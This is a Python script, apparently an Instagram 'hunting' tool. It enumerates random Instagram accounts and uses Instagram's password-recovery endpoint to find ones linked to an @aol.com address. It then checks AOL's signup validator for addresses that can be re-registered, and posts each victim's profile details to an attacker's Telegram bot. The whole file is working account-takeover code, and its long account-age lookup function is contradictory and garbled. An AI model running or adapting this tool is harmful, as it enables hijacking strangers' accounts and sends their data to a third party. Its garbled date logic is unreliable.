
















































import requests
import random
import string
import json
from threading import Thread   
import random
import os
import sys
import os
import importlib
import requests
import json
import hashlib
import uuid
import threading
import time
from user_agent import generate_user_agent as el
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
X = '\033[1;33m' #اصفر
F = '\033[2;32m'
Z = '\033[1;31m' 
L = "\033[1;95m"  #ارجواني
C = '\033[2;35m' #وردي
A = '\033[2;39m' #ازرق
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m' #وردي
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
F = '\033[2;32m'       # أخضر فاتح → True
gg = '\x1b[38;5;208m'  # برتقالي → علامة ×
X = '\033[1;33m'       # أصفر → False
Z = '\033[1;31m'       # أحمر → False label
A = '\033[2;39m'       # أزرق → Not
def elia5():
            sd= random.choice([J1,J2,J21,J22,F1,C1,P1,P2])
            os.system('clear||cls')
            print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
            print(sd + f"""

         ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
         ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
         ██║ ██╔██╗ ██║ ███████╗    ██║    ███████║
         ██║ ██║╚██╗██║ ╚════██║    ██║    ██╔══██║
         ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
         ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝

        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑬𝑳𝑰𝑨 ꧂ ]    {X}¸.•´¯`•.¸¸                       
              {F}TLE : @p_8nf / @XRRHX
    """)
            print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")

elia5()
tok = input(' TOKEN : ')
iid = input(' ID : ')
os.system('clear')
elia5()
print(f"{Z}[{F}𝟏{Z}] {C1}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟏  ")
print(f"{Z}[{F}𝟐{Z}] {C1}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟐  ")
print(f"{Z}[{F}𝟑{Z}] {C1}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟑  ")
print(f"{Z}[{F}𝟒{Z}] {C1}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟒  ")
print(f"{Z}[{F}𝟓{Z}] {C1}𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 𝟐𝟎𝟏𝟏 == 𝟐𝟎𝟐𝟑  ")
elia =input(f"{X}[{F}×{X}]{Z}𝐂𝐡𝐨𝐨𝐬𝐞 𝐰𝐡𝐚𝐭 𝐬𝐮𝐢𝐭𝐬 𝐲𝐨𝐮  : "+L)

if elia == '1':
    bbk = 10000
    id = 17699999
elif elia == '2':
    bbk = 17699999
    id = 263014407
elif elia == '3':
    bbk = 263014407
    id = 361365133
elif elia == '4':
    bbk = 361365133
    id = 1629010000
elif elia == '5':
    bbk = 10000
    id = 21254029834
else:
    print(f' لا تصير مطي الارقام موجده كدامك اختار وحد 😭')
    exit()

os.system('claer')
good_ins = 0
bad_ins = 0
good_gmail = 0
bad_gmail = 0
logo_shown = False
F = "\033[92m"  
Z = "\033[91m" 
X = "\033[93m"  
gg = "\033[94m" 
M = "\033[95m"
elia5()
def elia_inf(email):
    global  tlg
    global good_gmail, good_ins, bad_gmail, bad_ins, logo_shown
    if not logo_shown:
        logo_shown = True
        elia_inf.logo_lines = 20
    god = good_gmail
    bad = bad_gmail
    god_ins = good_ins
    ba_ins = bad_ins
    output = f"""
    
   {F}True aol:[{god}]
   {Z}False aol :[{bad}]
   {X}True Insta:[{god_ins}]
   {gg}False Insta:[{ba_ins}]
   {M}Domain : [{email}]"""
    sys.stdout.write(f"\033[{elia_inf.logo_lines}H")
    sys.stdout.write("\033[J") 
    sys.stdout.write(output + "\n")
    sys.stdout.flush()

def rest(email):
    rre=email.split('@')[0]
    uh='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    hr={
    'X-Developer-Info': "elia",
    'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
    'X-Pigeon-Rawclienttime':'1707104597.347',
    'X-IG-Connection-Speed':'-1kbps',
    'X-IG-Bandwidth-Speed-KBPS':'-1.000',
    'X-IG-Bandwidth-TotalBytes-B':'0',
    'X-IG-Bandwidth-TotalTime-MS':'0',
    'X-IG-VP9-Capable':'false',
    'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type':'WIFI',
    'X-IG-Capabilities':'3brTvw==',
    'X-IG-App-ID':'567067343352427',
    'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
    'Accept-Language':'ar-IQ, en-US',
    'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding':'gzip, deflate',
    'Host':'i.instagram.com',
    'X-FB-HTTP-Engine':'Liger',
    'Connection':'keep-alive',
    'Content-Length':'364',
    }
    dah={
    'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{rre}''"}',

    'ig_sig_key_version':'4',
    }
    k=requests.post(uh,headers=hr,data=dah).text
    try:return  k.split('email":"')[1].split('","status":"ok"}')[0]
    except:return False
def date(Id):
 try:
  if int(Id) >1 and int(Id)<1279000:
   return 2010
  elif int(Id)>1279001 and int(Id)<17750000:
   return 2011
  elif int(Id) > 17750001 and int(Id)<279760000:
   return 2012
  elif int(Id) > 106501 and int(Id)<106501:
   return 20100
  elif int(Id) > 194763261 and int(Id)<194763261:
   return 20133
  elif int(Id) > 2240339065 and int(Id)<2240339065:
   return 20155
  elif int(Id) > 4004018889 and int(Id)<4004018889:
   return 20177
  elif int(Id)>279760001 and int(Id)<900990000:
   return 2013
  elif int(Id)>900990001 and int(Id)< 1629010000:
   return 2014
  elif int(Id)>1900000000 and int(Id)<2500000000:
   return 2015
  elif int(Id)>2500000000 and int(Id)<3713668786:
   return 2016
  elif int(Id)>3713668786 and int(Id)<5699785217:
   return 2017
  elif int(Id)>5699785217 and int(Id)<8507940634:
   return 2018
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 2019
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 18
  elif int(Id)>14500000000 and int(Id)<23500000000:
   return 17
  elif int(Id)>3000000000 and int(Id)<4800000000:
   return 16
  elif int(Id)>9700000000 and int(Id)<14500000000:
   return 15
  elif int(Id)>6700000000 and int(Id)<9700000000:
   return 14
  elif int(Id)>4800000000 and int(Id)<6700000000:
   return 13
  elif int(Id)>4943062071 and int(Id)<8507940634:
   return 12
  elif int(Id)>8507940634 and int(Id)<13705588523:
   return 11
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 10
  elif int(Id)>13705588523 and int(Id)<21254029834:
   return 9
  elif int(Id)>9999999999 and int(Id)<99999999999:
   return 8
  elif int(Id)>8888888888 and int(Id)<88888888888:
   return 7
  elif int(Id)>7777777777 and int(Id)<77777777777:
   return 6
  elif int(Id)>6666666666 and int(Id)<66666666666:
   return 5
  elif int(Id)>5555555555 and int(Id)<55555555555:
   return 4
  elif int(Id)>4444444444 and int(Id)<44444444444:
   return 3
  elif int(Id)>3333333333 and int(Id)<33333333333:
   return 1
  elif int(Id)>2222222222 and int(Id)<22222222222:
   return 2
  elif int(Id)>1111111111 and int(Id)<11111111111:
   return 256
  elif int(Id)>0000000000 and int(Id)<00000000000:
   return 2009
  elif int(Id)>9000000000 and int(Id)<90000000000:
   return 20086
  elif int(Id)>8000000000 and int(Id)<80000000000:
   return 20752
  elif int(Id)>7000000000 and int(Id)<70000000000:
   return 20185
  elif int(Id)>6000000000 and int(Id)<60000000000:
   return 201908
  elif int(Id)>5000000000 and int(Id)<50000000000:
   return 201928
  elif int(Id)>4000000000 and int(Id)<40000000000:
   return 201977
  elif int(Id)>3000000000 and int(Id)<30000000000:
   return 201956
  elif int(Id)>2000000000 and int(Id)<20000000000:
   return 201956
  elif int(Id)>1000000000 and int(Id)<10000000000:
   return 20152
  elif int(Id) > 3000000000 and int(Id)<4800000000:
    return 2016
  elif int(Id) > 4800000000 and int(Id)<6700000000:
    return 2017
  elif int(Id) > 6700000000 and int(Id)<9700000000:
    return 2018
  elif int(Id) > 9700000000 and int(Id)<14500000000:
    return 2019
  elif int(Id) > 14500000000 and int(Id)<23500000000:
    return 2020
  elif int(Id) >10000000 and int(Id)<90000000:
    return 2010
  elif int(Id) > 90000000 and int(Id) < 180000000:
    return 2011
  elif int(Id) > 180000000 and int(Id) <290000000:
    return 2012
  elif int(Id) > 290000000 and int(Id) <450000000:
    return 2013
  elif int(Id) > 450000000 and int(Id) <720000000:
    return 2014
  elif int(Id) > 720000000 and int(Id) <990000000:
    return 2015
  elif int(Id) > 990000000 and int(Id) <1350000000:
    return 2016
  elif int(Id) > 1350000000 and int(Id) <1800000000:
    return 2017
  elif int(Id) > 1800000000 and int(Id) <2300000000:
    return 2018
  elif int(Id) > 2300000000 and int(Id) <2800000000:
    return 2019
  elif int(Id) > 2800000000 and int(Id) <3300000000:
    return 2020
  elif int(Id) > 3300000000 and int(Id) <3700000000:
    return 2021
  elif int(Id) > 3700000000 and int(Id) <4200000000:
    return 2022
  elif int(Id) > 4200000000 and int(Id) <4700000000:
    return 2023
  elif int(Id) > 4700000000 and int(Id) <5200000000:
    return 2024
  elif int(Id) > 5200000000:
    return 2025
  elif int(Id) > 1280000 and int(Id) < 17760000:
    return 2011
  elif int(Id) > 17760001 and int(Id) < 279770000:
    return 2012
  elif int(Id) > 106600 and int(Id) < 106700:
    return 20100
  elif int(Id) > 194763300 and int(Id) < 194763400:
    return 20133
  elif int(Id) > 2240339100 and int(Id) < 2240339200:
    return 20155
  elif int(Id) > 4004018900 and int(Id) < 4004019000:
    return 20177
  elif int(Id) > 279770001 and int(Id) < 900991000:
    return 2013
  elif int(Id) > 900991001 and int(Id) < 1629011000:
    return 2014
  elif int(Id) > 1900000100 and int(Id) < 2500000100:
    return 2015
  elif int(Id) > 2500000100 and int(Id) < 3713668800:
    return 2016
  elif int(Id) > 3713668800 and int(Id) < 5699785300:
    return 2017
  elif int(Id) > 5699785300 and int(Id) < 8507940700:
    return 2018
  elif int(Id) > 8507940700 and int(Id) < 21254029900:
    return 2019
  elif int(Id) > 14500000100 and int(Id) < 23500000100:
    return 2020
  elif int(Id) > 3000000100 and int(Id) < 4800000100:
    return 2016
  elif int(Id) > 4800000100 and int(Id) < 6700000100:
    return 2017
  elif int(Id) > 6700000100 and int(Id) < 9700000100:
    return 2018
  elif int(Id) > 9700000100 and int(Id) < 14500000100:
    return 2019
  elif int(Id) > 10000001 and int(Id) < 90000001:
    return 201066547
  elif int(Id) > 90000001 and int(Id) < 180000001:
    return 20116680
  elif int(Id) > 180000001 and int(Id) < 290000001:
    return 20129654
  elif int(Id) > 290000001 and int(Id) < 450000001:
    return 201335
  elif int(Id) > 450000001 and int(Id) < 720000001:
    return 20140999
  elif int(Id) > 720000001 and int(Id) < 990000001:
    return 20156800
  elif int(Id) > 990000001 and int(Id) < 1350000001:
    return 20169088
  elif int(Id) > 1350000001 and int(Id) < 1800000001:
    return 2017122
  elif int(Id) > 1800000001 and int(Id) < 2300000001:
    return 2018680
  elif int(Id) > 2300000001 and int(Id) < 2800000001:
    return 20193578
  elif int(Id) > 2800000001 and int(Id) < 3300000001:
    return 20206584
  elif int(Id) > 3300000001 and int(Id) < 3700000001:
    return 2021668
  elif int(Id) > 3700000001 and int(Id) < 4200000001:
    return 2022658
  elif int(Id) > 4200000001 and int(Id) < 4700000001:
    return 2023866
  elif int(Id) > 4700000001 and int(Id) < 5200000001:
    return 2024636
  elif int(Id) > 5200000001:
    return 202566
  elif int(Id) > 1000000000 and int(Id) < 1100000000:
    return 8
  elif int(Id) > 1100000000 and int(Id) < 1200000000:
    return 8
  elif int(Id) > 1200000000 and int(Id) < 1300000000:
    return 8
  elif int(Id) > 1300000000 and int(Id) < 1400000000:
    return 8
  elif int(Id) > 1400000000 and int(Id) < 1500000000:
    return 8
  elif int(Id) > 1500000000 and int(Id) < 1600000000:
    return 8
  elif int(Id) > 1600000000 and int(Id) < 1700000000:
    return 8
  elif int(Id) > 1700000000 and int(Id) < 1800000000:
    return 8
  elif int(Id) > 1800000000 and int(Id) < 1900000000:
    return 8
  elif int(Id) > 1900000000 and int(Id) < 2000000000:
    return 8
  elif int(Id) > 2000000000 and int(Id) < 2100000000:
    return 8
  elif int(Id) > 2100000000 and int(Id) < 2200000000:
    return 8
  elif int(Id) > 2200000000 and int(Id) < 2300000000:
    return 8
  elif int(Id) > 2300000000 and int(Id) < 2400000000:
    return 8
  elif int(Id) > 2400000000 and int(Id) < 2500000000:
    return 8
  elif int(Id) > 2500000000 and int(Id) < 2600000000:
    return 8
  elif int(Id) > 2600000000 and int(Id) < 2700000000:
    return 8
  elif int(Id) > 2700000000 and int(Id) < 2800000000:
    return 8
  elif int(Id) > 2800000000 and int(Id) < 2900000000:
    return 8
  elif int(Id) > 2900000000 and int(Id) < 3000000000:
    return 8
  elif int(Id) > 3000000000 and int(Id) < 3100000000:
    return 8
  elif int(Id) > 3100000000 and int(Id) < 3200000000:
    return 8
  elif int(Id) > 3200000000 and int(Id) < 3300000000:
    return 8
  elif int(Id) > 3300000000 and int(Id) < 3400000000:
    return 8
  elif int(Id) > 3400000000 and int(Id) < 3500000000:
    return 8
  elif int(Id) > 3500000000 and int(Id) < 3600000000:
    return 8
  elif int(Id) > 3600000000 and int(Id) < 3700000000:
    return 8
  elif int(Id) > 3700000000 and int(Id) < 3800000000:
    return 8
  elif int(Id) > 3800000000 and int(Id) < 3900000000:
    return 8
  elif int(Id) > 3900000000 and int(Id) < 4000000000:
    return 8
  elif int(Id) > 4000000000 and int(Id) < 4100000000:
    return 8
  elif int(Id) > 4100000000 and int(Id) < 4200000000:
    return 8
  elif int(Id) > 4200000000 and int(Id) < 4300000000:
    return 8
  elif int(Id) > 4300000000 and int(Id) < 4400000000:
    return 8
  elif int(Id) > 4400000000 and int(Id) < 4500000000:
    return 8
  elif int(Id) > 4500000000 and int(Id) < 4600000000:
    return 8
  elif int(Id) > 4600000000 and int(Id) < 4700000000:
    return 8
  elif int(Id) > 4700000000 and int(Id) < 4800000000:
    return 8
  elif int(Id) > 4800000000 and int(Id) < 4900000000:
    return 8
  elif int(Id) > 4900000000 and int(Id) < 5000000000:
    return 8
  elif int(Id) > 5000000000 and int(Id) < 5100000000:
    return 8
  elif int(Id) > 5100000000 and int(Id) < 5200000000:
    return 8
  elif int(Id) > 5200000000 and int(Id) < 5300000000:
    return 8
  elif int(Id) > 5300000000 and int(Id) < 5400000000:
    return 8
  elif int(Id) > 5400000000 and int(Id) < 5500000000:
    return 8
  elif int(Id) > 5500000000 and int(Id) < 5600000000:
    return 8
  elif int(Id) > 5600000000 and int(Id) < 5700000000:
    return 8
  elif int(Id) > 5700000000 and int(Id) < 5800000000:
    return 8
  elif int(Id) > 5800000000 and int(Id) < 5900000000:
    return 8
  elif int(Id) > 5900000000 and int(Id) < 6000000000:
    return 8
  else:
   return "2019-2022"
 except:
        return False
def info(email):
    global iid,tok

    res=rest(email)
    username=email.split("@")[0]
    try:
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)

        if response.status_code != 200:
           pass

        data = response.json()
        user = data['data']['user']


        user_info = {
            "username": user["username"],
            "Id":user['id'],
            "full_name": user["full_name"],
            "followers": user["edge_followed_by"]["count"],
            "following": user["edge_follow"]["count"],
            "posts": user["edge_owner_to_timeline_media"]["count"],
            "bio": user["biography"],
            "is_private": user["is_private"],
            "is_verified": user["is_verified"],
            "profile_pic_url": user["profile_pic_url"],
            "Developer ":"https://t.me/ii33cc"
        }
        Id=user_info['Id']
        full_name=user_info['full_name']
        followers=user_info['followers']
        following=user_info['following']
        posts=user_info['posts']
        bio=user_info['bio']
        is_verified=user_info['is_verified']
        is_private=user_info['is_private']
        profile_pic_url=user_info['profile_pic_url']
        cc = username
        resm = res
        if "@" in resm:
        	resm=resm.split('@')[0]
        re = cc[0] == resm[0] and cc[-1] == resm[-1]
        if cc[0] == resm[0] and cc[-1] == resm[-1]:
        	inf=" طلع بيانات صح ✅ "
        else:
        	inf=" طلع بيانات غلط ⛔ "        
        tlg=f'''
𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
𝐈𝐍𝐅𝐎 » {inf}
𝐍𝐀𝐌𝐄 » {full_name}
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 » {username}
𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒 »   {followers}
𝐅𝐎𝐋𝐋𝐎𝐖𝚰𝐍𝐆 »  {following}
𝐄𝐌𝐀𝚰𝐋 » {email}
𝐑𝐄𝐒𝐄𝐓 » {res}
𝐏𝐎𝐒𝐓𝐒 »  {user["edge_owner_to_timeline_media"]["count"]}
𝐁𝐈𝐎 » {bio}
𝐂𝐑𝐄𝐀𝐓𝐈𝐎𝐍 » {date(Id)}
𝐓𝐇𝐄 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐒  𝐏𝐑𝐈𝐕𝐀𝐓𝐄 » {is_private} 
𝗨𝗥𝗟 ➨ ( https://www.instagram.com/{username})  
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
﴾ py - @p_8nf • @XRRHX • ﴿              
 
'''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
    except requests.exceptions.RequestException as e:
        tlg=f'''
𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
𝐈𝐍𝐅𝐎 » {inf}
𝐄𝐌𝐀𝚰𝐋 » {email}
𝐑𝐄𝐒𝐄𝐓 » {res}
𝗨𝗥𝗟 ➨ ( https://www.instagram.com/{username})  
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
﴾ py - @p_8nf • @XRRHX • ﴿    
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
     


def Getaol():
    try:      
        qq = requests.get('https://login.aol.com/account/create', headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'accept-language': 'en-US,en;q=0.9',
        })
        cookies = qq.cookies.get_dict()
        tm1 = str(time.time()).split('.')[0]
        cookies.update({
            'gpp': 'DBAA',
            'gpp_sid': '-1',
            '__gads': f'ID=c0M0fd00676f0ea1:T={tm1}:RT={tm1}:S=ALNI_MaEGaVTSG6nQFkSJ-RnxSZrF5q5XA',
            '__gpi': f'UID=00000cf0e8904e94:T={tm1}:RT={tm1}:S=ALNI_MYCzPrYn9967HtpDSITUe5Z4ZwGOQ',
            'cmp': f't={tm1}&j=0&u=1---',
        })
        specData = qq.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
        specId = qq.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
        crumb = qq.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
        sessionIndex = qq.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
        acrumb = qq.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]

        try:
            os.remove('aol_req.txt')
            os.remove('aol_cok.txt')
        except:
            pass

        with open('aol_req.txt', 'a') as t:
            t.write(f"{specData}Π{specId}Π{crumb}Π{sessionIndex}Π{acrumb}\n")

        with open('aol_cok.txt', 'a') as g:
            g.write(str(cookies) + '\n')
    except Exception as e:
        print(e)
        Getaol()

Getaol()


def check_aol(email):
    global good_gmail, good_ins, bad_gmail, bad_ins
    try:
        if '@' in email:
            name = email.split('@')[0]
        else:
            name = email

        try:
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())
        except:
            Getaol()
            with open("aol_req.txt", "r") as f:
                for line in f:
                    specData, specId, crumb, sessionIndex, acrumb = line.strip().split('Π')

            with open("aol_cok.txt", "r") as f:
                for line in f:
                    cookies = eval(line.strip())

        headers = {
            'authority': 'login.aol.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://login.aol.com',
            'referer': f'https://login.aol.com/account/create?specId={specId}&done=https%3A%2F%2Fwww.aol.com',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'validateField': 'userId',
        }

        data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%204000%20(0x00000166)%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=ahmed&lastName=Mahos&userid-domain=yahoo&userId={name}&password=Drahmed2006##$$&mm=10&dd=24&yyyy=2000&signup='

        res = requests.post('https://login.aol.com/account/module/create', params=params, headers=headers, data=data, cookies=cookies).text
        if '{"errors":[]}' in res:
        	good_gmail +=1
        	info(email)
        	elia_inf(email)
        else:
        	bad_gmail+=1
        	elia_inf(email)
    except Exception as e:
        print('Error:', e)
        





def elia00(email):
    global good_gmail, good_ins, bad_gmail, bad_ins
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent':str(el()),
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
    	good_ins+=1
    	elia_inf(email)
    	check_aol(email)
    else:
    	bad_ins+=1 
    	elia_inf(email)  	


def elia8() -> str:
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": data["lsd"]},
            data=data
        )
        try:
            username = response.json().get('data', {}).get('user', {}).get('username')
            emails = [ username + '@aol.com']
            for email in emails:
            	elia00(email)
        except:''
for _ in range(75):
    Thread(target=elia8).start()
    

if __name__ == "__main__":
    elia8()
